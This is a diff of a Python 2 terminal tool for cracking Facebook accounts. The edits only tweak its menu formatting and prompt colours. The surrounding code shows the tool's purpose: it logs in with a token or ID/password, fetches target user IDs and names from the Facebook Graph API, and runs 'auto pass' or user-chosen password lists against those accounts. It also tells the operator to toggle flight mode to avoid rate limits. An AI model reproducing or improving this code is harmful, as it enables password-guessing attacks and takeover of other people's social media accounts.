@@ -35,7 +35,6 @@ def main():
     print logo
     print ("")
     print("[\033[1;91m\033[1;47m--------------START CRECKING--------------\033[0m\033[1;37m]")
-    print ("")
     os.system('echo -e "--------------------------------------------"| lolcat')
     print ' \x1b[1;97m ➤ [1] START CLONING'
     os.system('echo -e "--------------------------------------------"| lolcat')
@@ -59,6 +58,7 @@ def login():
     except (KeyError, IOError):
         os.system('clear')
         print logo
+        print ("")
         print("[\033[1;91m\033[1;47m---------------LOGIN MENU-----------------\033[0m]")
         os.system('echo -e "--------------------------------------------"| lolcat')
         print ' \x1b[1;97m ➤ [1] FACEBOOK ID/PASS LOGIN'
@@ -89,6 +89,7 @@ def log_fb():
         menu()
     except (KeyError, IOError):
         print logo
+        print ("")
         print("[\033[1;91m\033[1;47m-----------LOGIN WITH ID/PASS-------------\033[0m]")
         os.system('echo -e "--------------------------------------------"| lolcat')
         uid = raw_input(' \x1b[1;37mID ➤ \x1b[1;32m')
@@ -117,6 +118,7 @@ def token():
         menu()
     except (KeyError, IOError):
         print logo
+        print ("")
         print("[\033[1;91m\033[1;47m---------------LOGIN TOKEN----------------\033[0m]\033[1;37m")
         os.system('echo -e "--------------------------------------------"| lolcat')
         token = raw_input(' \x1b[1;37mPaste token here ➤ \x1b[1;32m ')
@@ -148,7 +150,9 @@ def menu():
 
     os.system('clear')
     print logo
+    print("")
     print '   \x1b[1;37mActive Token -> \x1b[1;32m' + name
+    print("")
     print("[\033[1;91m\033[1;47m---------------CRACING MENU---------------\033[0m]\033[0;97m")
     os.system('echo -e "--------------------------------------------"| lolcat')  
     print ' \x1b[1;97m ➤ [1] CRACK AUTO PASS'
@@ -182,6 +186,7 @@ def crack():
 
     os.system('clear')
     print logo
+    print ("")
     print("[\033[1;91m\033[1;47m------------AUTO PASS CLONING-------------\033[0m]\033[0;97m")
     os.system('echo -e "--------------------------------------------"| lolcat')
     print '\x1b[1;92m ➤ [1] CRACK PUBLIC ID'
@@ -199,6 +204,7 @@ def crack_select():
     if select == '1':
         os.system('clear')
         print logo
+        print ("")
         print("[\033[1;91m\033[1;47m---------------INPUT 5 IDS----------------\033[0m]\033[0;97m")
         os.system('echo -e "--------------------------------------------"| lolcat')
         idt = raw_input('(1) Input id ➤ \x1b[1;32m ')
@@ -219,7 +225,7 @@ def crack_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(2) Input id ➤ \x1b[1;32m')
+        idt = raw_input('\x1b[1;37m(2) Input id ➤ \x1b[1;32m')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
             q = json.loads(r.text)
@@ -237,7 +243,7 @@ def crack_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(3) Input id ➤ \x1b[1;32m')
+        idt = raw_input('\x1b[1;37m(3) Input id ➤ \x1b[1;32m')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
             q = json.loads(r.text)
@@ -255,7 +261,7 @@ def crack_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(4) Input id ➤ \x1b[1;32m ')
+        idt = raw_input('\x1b[1;37m(4) Input id ➤ \x1b[1;32m ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
             q = json.loads(r.text)
@@ -273,7 +279,7 @@ def crack_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(5) Input id ➤ \x1b[1;32m ')
+        idt = raw_input('\x1b[1;37m(5) Input id ➤ \x1b[1;32m ')
         os.system('echo -e "--------------------------------------------"| lolcat')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
@@ -296,7 +302,7 @@ def crack_select():
         os.system('clear')
         print logo
         os.system('echo -e "--------------------------------------------"| lolcat')
-        idt = raw_input('  Input id: ')
+        idt = raw_input('\x1b[1;37m(1) Input id ➤ \x1b[1;37m ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
@@ -324,7 +330,7 @@ def crack_select():
         print '\tSelect valid option'
         crack_select()
     os.system('echo -e "--------------------------------------------"| lolcat')
-    print ' \x1b[1;92m Total IDs : ' + str(len(id))
+    print ' \x1b[1;97m Total IDs ➤\x1b[1;32m ' + str(len(id))
     print ' \x1b[1;97m On off flight mode if no result'
     print ' \x1b[1;97m Press ctrl + z to stop'
     os.system('echo -e "--------------------------------------------"| lolcat')
@@ -474,6 +480,7 @@ def choice():
 
     os.system('clear')
     print logo
+    print ("")
     print("[\033[1;91m\033[1;47m-----------CHOICE PASS CRACK MENU----------\033[0m]\033[0;97m")
     os.system('echo -e "--------------------------------------------"| lolcat')
     print '\x1b[1;97m ➤ [1] CRACK PUBLIC ID'
@@ -491,15 +498,16 @@ def choice_select():
     if select == '1':
         os.system('clear')
         print logo
+        print ("")
         print("[\033[1;91m\033[1;47m----------------CHOICE PASS ---------------\033[0m]\033[0;97m")
         os.system('echo -e "--------------------------------------------"| lolcat')
         pass1 = raw_input('(1) Password ➤ \x1b[1;32m ')
-        pass2 = raw_input('(2) Password ➤ \x1b[1;32m ')
-        pass3 = raw_input('(3) Password ➤ \x1b[1;32m ')
-        pass4 = raw_input('(4) Password ➤ \x1b[1;32m ')
-        pass5 = raw_input('(5) Password ➤ \x1b[1;32m ')
-        pass6 = raw_input('(6) Password ➤ \x1b[1;32m ')
-        pass7 = raw_input('(7) Password ➤ \x1b[1;32m ')
+        pass2 = raw_input('\x1b[1;37m(2) Password ➤ \x1b[1;32m ')
+        pass3 = raw_input('\x1b[1;37m(3) Password ➤ \x1b[1;32m ')
+        pass4 = raw_input('\x1b[1;37m(4) Password ➤ \x1b[1;32m ')
+        pass5 = raw_input('\x1b[1;37m(5) Password ➤ \x1b[1;32m ')
+        pass6 = raw_input('\x1b[1;37m(6) Password ➤ \x1b[1;32m ')
+        pass7 = raw_input('\x1b[1;37m(7) Password ➤ \x1b[1;32m ')
         os.system('echo -e "--------------------------------------------"| lolcat')
         os.system('clear')
         print logo
@@ -598,15 +606,16 @@ def choice_select():
     elif select == '2':
         os.system('clear')
         print logo
+        print ("")
         print("[\033[1;91m\033[1;47m----------------CHOICE PASS ---------------\033[0m]\033[0;97m")
         os.system('echo -e "--------------------------------------------"| lolcat')
         pass1 = raw_input('(1) Password ➤ \x1b[1;32m ')
-        pass2 = raw_input('(2) Password ➤ \x1b[1;32m ')
-        pass3 = raw_input('(3) Password ➤ \x1b[1;32m ')
-        pass4 = raw_input('(4) Password ➤ \x1b[1;32m ')
-        pass5 = raw_input('(5) Password ➤ \x1b[1;32m ')
-        pass6 = raw_input('(6) Password ➤ \x1b[1;32m ')
-        pass7 = raw_input('(7) Password ➤ \x1b[1;32m ')
+        pass2 = raw_input('\x1b[1;37m(2) Password ➤ \x1b[1;32m ')
+        pass3 = raw_input('\x1b[1;37m(3) Password ➤ \x1b[1;32m ')
+        pass4 = raw_input('\x1b[1;37m(4) Password ➤ \x1b[1;32m ')
+        pass5 = raw_input('\x1b[1;37m(5) Password ➤ \x1b[1;32m ')
+        pass6 = raw_input('\x1b[1;37m(6) Password ➤ \x1b[1;32m ')
+        pass7 = raw_input('\x1b[1;37m(7) Password ➤ \x1b[1;32m ')
         os.system('echo -e "--------------------------------------------"| lolcat')
         os.system('clear')
         print logo
@@ -632,7 +641,7 @@ def choice_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(2) Input id ➤ \x1b[1;32m')
+        idt = raw_input('\x1b[1;37m(2) Input id ➤ \x1b[1;32m')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
@@ -654,7 +663,7 @@ def choice_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(3) Input id ➤ \x1b[1;32m')
+        idt = raw_input('\x1b[1;37m(3) Input id ➤ \x1b[1;32m')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
@@ -676,7 +685,7 @@ def choice_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(4) Input id ➤ \x1b[1;32m')
+        idt = raw_input('\x1b[1;37m(4) Input id ➤ \x1b[1;32m')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
@@ -698,7 +707,7 @@ def choice_select():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-        idt = raw_input('(5) Input id ➤ \x1b[1;32m')
+        idt = raw_input('\x1b[1;37m(5) Input id ➤ \x1b[1;32m')
         os.system('echo -e "--------------------------------------------"| lolcat')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -725,7 +734,7 @@ def choice_select():
         print '\t\x1b[1;31mSelect valid option\x1b[0;97m'
         choice_select()
     os.system('echo -e "--------------------------------------------"| lolcat')
-    print ' \x1b[1;92m Total IDs : ' + str(len(id))
+    print ' \x1b[1;97m Total IDs ➤\x1b[1;32m ' + str(len(id))
     print ' \x1b[1;92m On off flight mode if no result'
     print ' \x1b[1;93m Press ctrl + z to stop'
     os.system('echo -e "--------------------------------------------"| lolcat')
